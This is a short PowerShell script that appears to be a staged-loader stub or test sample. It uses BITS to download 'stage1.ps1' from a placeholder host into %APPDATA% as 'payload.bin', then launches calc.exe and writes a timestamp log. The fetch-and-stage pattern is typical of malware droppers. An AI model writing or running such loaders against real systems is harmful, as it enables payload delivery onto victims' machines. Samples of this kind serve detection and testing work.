<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$DownloadUrl = "https://example.net:443/stage1.ps1",
    [string]$Stage2Path = "$env:APPDATA\payload.bin",
    [int]$StageTimeout = 179
)
try { Start-BitsTransfer -Source $DownloadUrl -Destination $Stage2Path; Start-Process -FilePath "calc.exe"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Loader step failed" }
